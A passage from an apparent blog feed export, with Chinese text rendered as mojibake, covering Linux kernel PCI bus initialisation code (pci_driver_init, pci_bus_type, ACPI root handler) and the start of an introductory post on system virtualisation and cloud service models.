æ³¨å†Œ pci_bus classï¼Œåˆ›å»º sysfs ä¸‹çš„ class/pci_bus ç›®å½•</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">pci_driver_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// æ³¨å†Œ pci_bus_typeï¼Œåˆ›å»º sysfs ä¸‹çš„ bus/pci ç›®å½•</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">acpi_pci_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// æ³¨å†Œ acpi_pci_busï¼Œå¹¶è®¾ç½®ç”µæºç®¡ç†çš„ç›¸åº”æ“ä½œ</span><br>â†“<br><span class="hljs-function"><span class="hljs-title">acpi_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// pcie åˆå§‹åŒ–å…¥å£ï¼Œè¿›è¡Œè®¾å¤‡è¯†åˆ«ä¸æ¨¡å‹å»ºç«‹</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æŒ‘å…¶ä¸­å…³é”®çš„å‡ ä¸ªæ¥çœ‹ï¼Œé¦–å…ˆæ˜¯ <code>acpi_init()</code>ï¼Œå­˜åœ¨å¦‚ä¸‹è°ƒç”¨è·¯å¾„ï¼š</p><blockquote><p>å‰ç½®çŸ¥è¯†ï¼šACPI è§„èŒƒ</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">acpi_init</span>()<br><span class="hljs-built_in">pci_mmcfg_late_init</span>() <span class="hljs-comment">// æ‰«æ MCFG è¡¨ï¼Œè·å–æ‰€æœ‰è®¾å¤‡PCIé…ç½®ç©ºé—´çš„åŸºåœ°å€</span><br><span class="hljs-built_in">acpi_scan_init</span>()<br><span class="hljs-built_in">acpi_pci_root_init</span>()<br><span class="hljs-built_in">acpi_scan_add_handler_with_hotplug</span>()<span class="hljs-comment">// æ·»åŠ  handlerï¼špci_root_handler</span><br><span class="hljs-built_in">acpi_bus_scan</span>()<span class="hljs-comment">// è®¾å¤‡æ‰«æï¼Œåˆ›å»º ACPI è®¾å¤‡èŠ‚ç‚¹å¯¹è±¡</span><br><span class="hljs-built_in">acpi_bus_attach</span>()<span class="hljs-comment">// å¤„ç†å•ä¸ªèŠ‚ç‚¹å¹¶è°ƒç”¨ acpi_bus_attach() å¤„ç†å­èŠ‚ç‚¹ï¼ˆDFSï¼‰</span><br><span class="hljs-built_in">acpi_scan_attach_handler</span>()<span class="hljs-comment">// æŸ¥æ‰¾åŒ¹é…çš„ handler å¹¶è°ƒç”¨ attach æŒ‡é’ˆ</span><br>handler-&gt;<span class="hljs-built_in">attach</span>(device, devid)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬æ¥çœ‹å¯¹åº”çš„ handlerï¼Œä¸ºåœ¨ <code>acpi_scan_add_handler_with_hotplug()</code> ä¸­æ³¨å†Œçš„ <code>pci_root_handler</code> ï¼Œè¯¥å˜é‡å®šä¹‰äº <code>/drivers/acpi/pci_host.c</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_scan_handler</span> <span class="hljs-title">pci_root_handler</span> =</span> &#123;<br>.ids = root_device_ids,<br>.attach = acpi_pci_root_add,<br>.detach = acpi_pci_root_remove,<br>.hotplug = &#123;<br>.enabled = <span class="hljs-literal">true</span>,<br>.scan_dependent = acpi_pci_root_scan_dependent,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>äºæ˜¯æœ€åè°ƒç”¨åˆ° <code>acpi_pci_root_add()</code>ï¼Œä¸ºè®¾å¤‡èŠ‚ç‚¹åˆ›å»ºå¯¹åº”çš„å†…æ ¸ç»“æ„ä½“</p><blockquote><p>è¿™ä¸ªå‡½æ•°ä¸­é—´å…¶å®è¿˜æœ‰ä¸€äº›è¿‡ç¨‹ï¼Œ<s>ä½†æ˜¯ğŸ‘´æ‘¸äº†</s></p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>pci_driver_init()</code>ï¼Œè¯¥å‡½æ•°åœ¨å†…æ ¸é©±åŠ¨æ¨¡å‹ä¸­æ³¨å†Œäº† PCI æ€»çº¿ï¼Œå¹¶å®šä¹‰äº†ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">pci_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = bus_register(&amp;pci_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PCIEPORTBUS</span><br>ret = bus_register(&amp;pcie_port_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>dma_debug_add_bus(&amp;pci_bus_type);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>postcore_initcall(pci_driver_init);<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸­è°ƒç”¨äº† <code>bus_register()</code> æ¥æ³¨å†Œ PCI æ€»çº¿ï¼Œå¯¹åº”åˆ°ç¬¦åˆå†…æ ¸è®¾å¤‡é©±åŠ¨æ¨¡å‹çš„æ€»çº¿ç±»å‹çš„å˜é‡ä¸º <code>pci_bus_type</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus_type</span> <span class="hljs-title">pci_bus_type</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;pci&quot;</span>,<br>.match= pci_bus_match,<br>.uevent= pci_uevent,<br>.probe= pci_device_probe,<br>.remove= pci_device_remove,<br>.shutdown= pci_device_shutdown,<br>.dev_groups= pci_dev_groups,<br>.bus_groups= pci_bus_groups,<br>.drv_groups= pci_drv_groups,<br>.pm= PCI_PM_OPS_PTR,<br>.num_vf= pci_bus_num_vf,<br>.dma_configure= pci_dma_configure,<br>.dma_cleanup= pci_dma_cleanup,<br>&#125;;<br>EXPORT_SYMBOL(pci_bus_type);<br></code></pre></td></tr></table></figure><h2 id="äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶">äºŒã€è®¾å¤‡é©±åŠ¨æ¡†æ¶</h2><h2 id="ä¸‰ã€PCI-probe-è®¾å¤‡è¯†åˆ«">ä¸‰ã€PCI probe - è®¾å¤‡è¯†åˆ«</h2><h2 id="å››ã€PCI-remove-è®¾å¤‡ç§»é™¤">å››ã€PCI remove - è®¾å¤‡ç§»é™¤</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;ğŸ‘´ç­‰ä¼šæŠŠä½ æ€»çº¿éƒ½ç»™æ‰¬äº†&lt;/p&gt;</summary>
    
    
    
    <category term="HARDWARE" scheme="http://blog.arttnba3.cn/categories/HARDWARE/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="è®¡ç®—æœºç»„æˆåŸç†" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="Linux Driver" scheme="http://blog.arttnba3.cn/tags/Linux-Driver/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRT.0x02ã€‘ç³»ç»Ÿè™šæ‹ŸåŒ–å¯¼è®º</title>
    <link href="http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/"/>
    <id>http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/</id>
    <published>2022-08-28T20:39:22.000Z</published>
    <updated>2022-09-04T16:44:45.982Z</updated>
    
    <content type="html"><![CDATA[<p>è™šæ‹ŸåŒ–æ–¹å‘YLGé€Ÿæˆå…¥é—¨æŒ‡åŒ—</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å› ä¸ºç¬”è€…æœ€è¿‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼€å§‹åš X86 è™šæ‹ŸåŒ–è¿™ä¸€å—çš„å·¥ä½œäº†ï¼ˆå¤§é›¾ï¼‰ï¼Œè€Œè™šæ‹ŸåŒ–çš„çŸ¥è¯†ç‚¹æ¯”è¾ƒæ‚ä¹Ÿæ¯”è¾ƒä¹±ï¼Œæ‰€ä»¥ç‰¹åœ°å¼€è¿™ä¸€ç¯‡åšå®¢ç®€å•è®°å½•ä¸€ä¸‹è™šæ‹ŸåŒ–çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µ</p><h1>0x01. Virtualization Basis</h1><h2 id="ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ">ä¸€ã€è™šæ‹ŸåŒ–çš„åŸºæœ¬æ¦‚å¿µ</h2><p>ä»€ä¹ˆæ˜¯è™šæ‹ŸåŒ–ï¼Ÿç‹­ä¹‰åœ°è¯´ï¼Œå¤§å®¶åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­è¯´åˆ°çš„è™šæ‹ŸåŒ–ä¸»è¦æŒ‡çš„è¿˜æ˜¯ <em>è™šæ‹Ÿæœº</em> ï¼ˆVirtual Machineï¼‰ï¼Œå³<strong>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å°†ä¸€å°è®¡ç®—æœºè™šæ‹Ÿä¸ºå¤šå°é€»è¾‘è®¡ç®—æœº</strong>â€”â€”è¿™å…¶å®æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ä¸­çš„ä¸€ä¸ªæŠ½è±¡ç²’åº¦ä¸ºå•ä¸ªè®¡ç®—æœºçš„åˆ†æ”¯ï¼š<code>ç³»ç»Ÿè™šæ‹ŸåŒ–</code></p><p>åœ¨è®¡ç®—æœºç§‘å­¦å½“ä¸­ï¼Œ<strong>è™šæ‹ŸåŒ–</strong>ï¼ˆVirtualizationï¼‰æŒ‡çš„å…¶å®æ˜¯ä¸€ç§ã€Œ<strong>å°†è®¡ç®—æœºçš„å„ç§å®ä½“èµ„æºè¿›è¡Œé€»è¾‘æŠ½è±¡ï¼Œä»è€Œå‘ˆç°å‡ºä¸åŒçš„è™šæ‹Ÿèµ„æº</strong>ã€çš„èµ„æºç®¡ç†æŠ€æœ¯ã€‚åˆ©ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“ç ´å®ä½“ç»“æ„é—´ä¸å¯åˆ‡å‰²çš„ç‰¹æ€§â€”â€”ä¸€ä»½å®ä½“èµ„æºå¯ä»¥å¯¹ç”¨æˆ·å‘ˆç°ä¸ºå¤šä»½è™šæ‹Ÿèµ„æºï¼Œå¤šä»½å®ä½“èµ„æºä¹Ÿå¯ä»¥å‘ˆç°ä¸ºä¸€ä»½ç‰©ç†èµ„æºã€‚</p><p>é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°èµ„æºçš„åŠ¨æ€åˆ†é…ã€çµæ´»è°ƒåº¦ã€è·¨åŸŸå…±äº«ç­‰ï¼Œä»è€Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚</p><p><img src="https://s2.loli.net/2022/08/09/Tj6qGVH82suwhMy.png" alt="image.png"></p><blockquote><p>è¿™é‡Œæ‰€è¯´çš„å®ä½“èµ„æºåŒ…æ‹¬<strong>CPUã€å†…å­˜ã€ç£ç›˜ç©ºé—´ã€ç½‘ç»œé€‚é…å™¨</strong>ç­‰ã€‚</p></blockquote><p>è¿™é‡Œç¬”è€…æ‘˜æŠ„ä¸€æ®µæ¥è‡ªä¸€æœ¬ç»å…¸çš„è™šæ‹ŸåŒ–æŠ€æœ¯æ•™æçš„å™è¿°ï¼š</p><blockquote><p>æŠ½è±¡æ¥è¯´ï¼Œè™šæ‹ŸåŒ–æ˜¯èµ„æºçš„é€»è¾‘è¡¨ç¤ºï¼Œå®ƒä¸å—ç‰©ç†é™åˆ¶çš„çº¦æŸã€‚å…·ä½“æ¥è¯´ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯çš„å®ç°å½¢å¼æ˜¯åœ¨ç³»ç»Ÿä¸­åŠ å…¥ä¸€ä¸ªè™šæ‹Ÿå±‚ï¼Œè™šæ‹ŸåŒ–å±‚å°†ä¸‹å±‚çš„èµ„æºæŠ½è±¡æˆå¦ä¸€å½¢å¼çš„èµ„æºï¼Œæä¾›ç»™ä¸Šå±‚ä½¿ç”¨ã€‚é€šè¿‡ç©ºé—´ä¸Šçš„åˆ†å‰²ã€æ—¶é—´ä¸Šçš„åˆ†æ—¶ä»¥åŠæ¨¡æ‹Ÿï¼Œè™šæ‹ŸåŒ–å¯ä»¥å°†ä¸€ä»½èµ„æºæŠ½è±¡æˆå¤šåˆ†ã€‚åè¿‡æ¥ï¼Œè™šæ‹ŸåŒ–ä¹Ÿå¯ä»¥å°†å¤šä»½èµ„æºæŠ½è±¡æˆä¸€ä»½ã€‚</p><p>â€”â€”ã€Šç³»ç»Ÿè™šæ‹ŸåŒ–ï¼šåŸç†ä¸å®ç°ã€‹</p></blockquote><p>å³è™šæ‹ŸåŒ–æŠ€æœ¯çš„å®ç°å…¶å®æºè‡ªäºç°ä»£è®¡ç®—æœºç³»ç»Ÿè‡ªä¸‹è€Œä¸Šçš„å¤šå±‚æŠ½è±¡çš„ç»“æ„ï¼šã€Œ<strong>æ¯ä¸ªå±‚æ¬¡éƒ½å‘ä¸Šä¸€å±‚æ¬¡å‘ˆç°ä¸€ä¸ªæŠ½è±¡ï¼Œæ¯ä¸€å±‚åªéœ€è¦çŸ¥é“ä¸‹å±‚çš„æŠ½è±¡æ¥å£ï¼Œè€Œæ— éœ€äº†è§£å…¶å†…éƒ¨è¿ä½œæœºåˆ¶</strong>ã€â€”â€”æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>åªè¦æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æŸç§æ–¹å¼å‘ä¸Šå±‚æä¾›è¡¨ç°ç›¸åŒçš„æŠ½è±¡æ¥å£ï¼Œåœ¨ä¸Šå±‚çœ‹æ¥æˆ‘ä»¬å°±æ˜¯æ­£å¸¸çš„è¯¥å±‚æ‰€æä¾›çš„èµ„æºï¼Œä»è€Œå°±å®ç°äº†å¯¹è¯¥å±‚çš„è™šæ‹ŸåŒ–ã€‚</strong></p><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png" alt="image.png"></p><p>ç”±æ­¤ï¼Œä»ç‰©ç†å±‚ä¸è™šæ‹Ÿå±‚çš„ä¸¤ä¾§æ¥çœ‹ï¼Œæˆ‘ä»¬ä¾¿æœ‰äº†è™šæ‹ŸåŒ–ä¸­çš„ä¸¤ä¸ªé‡è¦å®šè¯­ï¼š</p><ul><li>ã€Œ<strong>Host</strong>ã€ï¼šç‰©ç†èµ„æºæ–¹</li><li>ã€Œ<strong>Guest</strong>ã€ï¼šè™šæ‹Ÿèµ„æºæ–¹</li></ul><p>æ ¹æ®èµ„æºçš„ä¸åŒï¼Œåœ¨è¿™ä¸¤ä¸ªå®šè¯­ä¹‹åæˆ‘ä»¬å¯ä»¥æ¥ä¸åŒçš„åè¯ï¼šä¾‹å¦‚æˆ‘ä»¬å°†ä¸€å°ç‰©ç†æœºå™¨ç§°ä¹‹ä¸º <code>Host Machine</code> ï¼ˆå®¿ä¸»æœºï¼‰ï¼Œå°†è¿è¡Œåœ¨å…¶ä¸Šçš„è™šæ‹Ÿæœºç§°ä¹‹ä¸º <code>Guest Machine</code> ï¼ˆå®¢æˆ·æœºï¼‰ï¼›ç›¸åº”åœ°ï¼Œåœ¨å®¿ä¸»æœºä¸Šè‹¥è¿è¡Œæœ‰æ“ä½œç³»ç»Ÿï¼Œåˆ™ç§°ä¹‹ä¸º <code>Host OS</code>ï¼Œè€Œè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­çš„æ“ä½œç³»ç»Ÿç§°ä¹‹ä¸º <code>Guest OS</code></p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å°†ä½äºä¸åŒæŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–åˆ†ä¸ºå¦‚ä¸‹ç±»ï¼š</p><ul><li><strong>ç¡¬ä»¶æŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–</strong>ï¼šé€šè¿‡è™šæ‹Ÿç¡¬ä»¶æŠ½è±¡å±‚æ¥å®ç°è™šæ‹Ÿæœºå™¨ï¼Œä¸º Guest OS å‘ˆç°ä¸ç‰©ç†ç¡¬ä»¶ç›¸åŒæˆ–ç›¸ç±»ä¼¼çš„ç¡¬ä»¶æŠ½è±¡å±‚ï¼Œä¹Ÿç§°ä¹‹ä¸ºã€Œ<strong>ç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong>ã€ï¼ˆä¾‹å¦‚VMWareã€Xenï¼‰</li><li>æ“ä½œç³»ç»Ÿå±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šé€šå¸¸æŒ‡çš„æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸å¯ä»¥æä¾›å¤šä¸ªäº’ç›¸éš”ç¦»çš„ç”¨æˆ·æ€å®ä¾‹ï¼ˆé€šå¸¸ç§°ä¹‹ä¸ºå®¹å™¨ï¼‰ï¼Œè¿™äº›ç”¨æˆ·æ€å®ä¾‹å¯¹å…¶ç”¨æˆ·è€Œè¨€å°±åƒæ˜¯ä¸€å°çœŸå®çš„è®¡ç®—æœºï¼Œæœ‰ç€è‡ªå·±ç‹¬ç«‹çš„ç½‘ç»œã€æ–‡ä»¶ç³»ç»Ÿç­‰ï¼ˆä¾‹å¦‚ VServerï¼‰</li><li>åº“å‡½æ•°å±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šé€šè¿‡è™šæ‹ŸåŒ–æ“ä½œç³»ç»Ÿçš„åº”ç”¨çº§åº“å‡½æ•°çš„æœåŠ¡æ¥å£ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºä¸éœ€è¦ä¿®æ”¹å°±å¯ä»¥åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­æ— ç¼è¿è¡Œï¼ˆä¾‹å¦‚ Wineã€WSLï¼‰</li><li>ç¼–ç¨‹è¯­è¨€å±‚ä¸Šçš„è™šæ‹ŸåŒ–ï¼šè¿™ç±»è™šæ‹Ÿæœºè¿è¡Œçš„æ˜¯è¿›ç¨‹çº§åˆ«çš„ä¸å­˜åœ¨äºç¡¬ä»¶ä¸Šçš„è™šæ‹Ÿä½“ç³»ç»“æ„ï¼Œå…¶ç¨‹åºä»£ç ç”±è™šæ‹Ÿæœºçš„è¿è¡Œæ—¶æ”¯æŒç³»ç»Ÿ<strong>ç¿»è¯‘</strong>æˆæœºå™¨è¯­è¨€åå†æ‰§è¡Œï¼Œå±äºè¿›ç¨‹çº§çš„è™šæ‹ŸåŒ–ï¼ˆä¾‹å¦‚ JVMï¼‰</li></ul><blockquote><p>ä¾‹å¦‚ Linux kernel å½“ä¸­çš„ VFS ä¾¿æ˜¯éå¸¸ç¬¦åˆè™šæ‹ŸåŒ–è¿™ä¸€æ¦‚å¿µçš„å­ç³»ç»Ÿï¼šä»ä¸Šå±‚è°ƒç”¨çš„è§’åº¦è€Œè¨€ï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„éƒ½æ˜¯ç»Ÿä¸€çš„ API æ¥å£ï¼Œä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“å®ç°åˆ™è¢«éšè—åœ¨äº† VFS å±‚çš„ä¸‹æ–¹ã€‚æˆ‘ä»¬åªéœ€è¦çŸ¥é“åœ¨è¿™ä¸€æŠ½è±¡å±‚ä¸­ openã€readã€write ç­‰æŠ½è±¡ API çš„ç”¨æ³•ï¼Œè€Œæ— éœ€å…³æ³¨åº•å±‚çš„ ext4 æˆ–æ˜¯ ntfs çš„å†…éƒ¨å®ç°ã€‚</p><p>è™šæ‹ŸåŒ–äº¦æ˜¯å¦‚æ­¤ï¼Œä» Guest ä¾§æˆ‘ä»¬æ‰€èƒ½çœ‹åˆ°çš„ä¹Ÿåªæ˜¯ç»Ÿä¸€çš„è™šæ‹Ÿèµ„æºçš„æ¥å£ï¼Œæˆ–è€…è¯´ Host ä¸ºæˆ‘ä»¬å‘ˆç°å‡ºäº†è™šæ‹ŸåŒ–çš„èµ„æºæ¥å£ï¼Œå…¶è¡¨ç°çš„è¡Œä¸ºä¸å®ä½“è®¾å¤‡æ˜¯ä¸€è‡´çš„ã€‚</p></blockquote><p>æˆ‘ä»¬æ—¥å¸¸æ‰€è¯´çš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸»è¦æ˜¯<strong>ç¡¬ä»¶æŠ½è±¡å±‚ä¸Šçš„è™šæ‹ŸåŒ–</strong>ï¼Œå³ã€Œ<strong>ç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong>ã€ï¼šé€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯å°†ä¸€å°è®¡ç®—æœºè™šæ‹Ÿä¸ºå¤šå°é€»è¾‘è®¡ç®—æœº</p><p>é’ˆå¯¹å®ä½“èµ„æºç±»å‹çš„ä¸åŒï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å†ç»†åˆ†ä¸ºï¼š</p><ul><li><strong>è®¡ç®—è™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ CPU å’Œå†…å­˜èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>ç½‘ç»œè™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ç½‘ç»œé“¾è·¯èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>IOè™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ IO èµ„æºè¿›è¡Œè™šæ‹ŸåŒ–</li><li><strong>å­˜å‚¨è™šæ‹ŸåŒ–</strong>ï¼šé’ˆå¯¹ç£ç›˜å­˜å‚¨èµ„æºè™šæ‹ŸåŒ–</li></ul><h2 id="äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—">äºŒã€è™šæ‹ŸåŒ–ä¸äº‘è®¡ç®—</h2><p>è¯´åˆ°è™šæ‹ŸåŒ–å°±ä¸å¾—ä¸æäº‘è®¡ç®—è¿™ä¸€â€œæ–°å…´äº‹ç‰©â€ï¼ˆå…¶å®åœ¨ç¬”è€…å†™ä¸‹è¿™å¥è¯çš„æ—¶å€™äº‘è®¡ç®—æŠ€æœ¯å·²ç»å‘å±•å¤šå¹´äº†hhhï¼‰ï¼Œä¼¼ä¹æ¯æ¬¡æåˆ°äº‘è®¡ç®—æ€»æ˜¯ç¦»ä¸å¼€è™šæ‹ŸåŒ–è¿™ä¸ªè¯ï¼Œé‚£å…ˆæ¥å’Œç¬”è€…ä¸€èµ·çœ‹ä¸€ä¸‹ã€Œä»€ä¹ˆæ˜¯äº‘è®¡ç®—å§ã€ï¼ˆç¬‘ï¼‰</p><ul><li>ã€Œ<strong>äº‘è®¡ç®—</strong>ã€ï¼ˆCloud computingï¼‰å³<strong>é€šè¿‡ç½‘ç»œå‘ç”¨æˆ·æŒ‰éœ€æä¾›å¯åŠ¨æ€ä¼¸ç¼©çš„è®¡ç®—æœåŠ¡ä¸ IT èµ„æº</strong>ï¼Œäº‘æœåŠ¡å‚å•†å°†å¤šä»½å®ä½“èµ„æºä»¥ä¸€å®šå½¢å¼è¿›è¡Œæ•´åˆåï¼Œå°†å…¶ç§°ä¹‹ä¸ºã€Œ<strong>äº‘</strong>ã€ï¼Œé€šè¿‡äº’è”ç½‘æŒ‰éœ€å‘ç”¨æˆ·æä¾›å…¶æ‰€éœ€çš„èµ„æº</li></ul><p>ç›¸ä¿¡å¤§å®¶å·²ç»æ³¨æ„åˆ°å…¶ç›¸ä¼¼ä¹‹å¤„äº†â€”â€”<strong>è™šæ‹ŸåŒ–æŠ€æœ¯ä¾¿æ˜¯äº‘è®¡ç®—æœåŠ¡çš„æŠ€æœ¯åŸºçŸ³ä¹‹ä¸€</strong></p><ul><li>é€šè¿‡è™šæ‹ŸåŒ–å¯ä»¥è§£å†³æ•°æ®ä¸­å¿ƒï¼ˆIDCï¼‰èµ„æºæ•´åˆçš„é—®é¢˜ï¼Œå¯¹è®¡ç®—ã€å­˜å‚¨ç­‰èµ„æºè¿›è¡Œæ ‡å‡†åŒ–</li><li>é€šè¿‡è™šæ‹ŸåŒ–å¯ä»¥å°†èµ„æºè¿›è¡Œæ›´ä¸ºåˆç†çš„åˆ‡å‰²è°ƒåº¦ï¼Œä»è€Œå……åˆ†åˆ©ç”¨ç¡¬ä»¶èµ„æº</li></ul><p><img src="https://s2.loli.net/2022/08/08/5ncJFCOLByoqbPM.png" alt="image.png"></p><blockquote><p>å½“ç„¶äº‘è®¡ç®—çš„åŸºçŸ³ä¸ä»…ä»…æ˜¯è™šæ‹ŸåŒ–ï¼Œä½†æ˜¯è¿™ç¯‡åšå®¢ä¸»è¦è®²çš„è¿˜æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–è€Œä¸æ˜¯äº‘è®¡ç®—ï¼ˆç¬‘ï¼‰</p></blockquote><p>æ ¹æ®æä¾›çš„èµ„æºæœåŠ¡çš„ç±»å‹ä¸åŒï¼Œæˆ‘ä»¬å°†äº‘æœåŠ¡åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p><ul><li><p><strong>Infrastructure-as-a-Service</strong>ï¼ˆIaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>å®Œæ•´çš„åŸºç¡€è®¾æ–½</strong>ï¼Œå³æä¾›<strong>äº‘ç¡¬ä»¶ç¯å¢ƒ</strong>ï¼ŒåŒ…æ‹¬è®¡ç®—ï¼ˆCPUï¼‰ã€å­˜å‚¨ï¼ˆç¡¬ç›˜ï¼‰ã€ç½‘ç»œç­‰ï¼Œç”¨æˆ·éœ€è¦è‡ªè¡Œåœ¨äº‘ç¡¬ä»¶ç¯å¢ƒä¸Šæ­å»ºè‡ªå·±éœ€è¦çš„æœåŠ¡</p><blockquote><p>é€šä¿—ç‚¹è¯´å°±æ˜¯å–æœåŠ¡å™¨ï¼ˆç¬‘ï¼‰</p></blockquote></li><li><p><strong>Platform-as-a-Service</strong>ï¼ˆPaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>è½¯ä»¶éƒ¨ç½²å¹³å°</strong>ï¼Œå³æä¾›æœåŠ¡å™¨å¹³å°æˆ–è€…å¼€å‘ç¯å¢ƒï¼Œç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨äº‘å¹³å°ä¸Šè¿›è¡Œå¼€å‘éƒ¨ç½²ç­‰å·¥ä½œï¼Œ<strong>è€Œæ— éœ€ç®¡ç†åº•å±‚çš„åŸºç¡€è®¾æ–½</strong></p><blockquote><p>æ¯”å¦‚è¯´å¾®è½¯çš„ Azure å’Œ Redhat çš„ OpenShift</p></blockquote></li><li><p><strong>Software-as-a-Service</strong>ï¼ˆSaaSï¼‰ï¼šäº‘å‚å•†å‘ç”¨æˆ·æä¾›<strong>å…·ä½“çš„è½¯ä»¶æœåŠ¡</strong>ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ç½‘ç»œç›´æ¥ä½¿ç”¨å‚å•†æä¾›çš„æœåŠ¡</p><blockquote><p>æ¯”å¦‚è¯´è…¾è®¯çš„å…±äº«æ–‡æ¡£å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ SaaS</p></blockquote></li></ul><p><img src="https://s2.loli.net/2022/08/07/nF3wLu5cfZQtpPK.png" 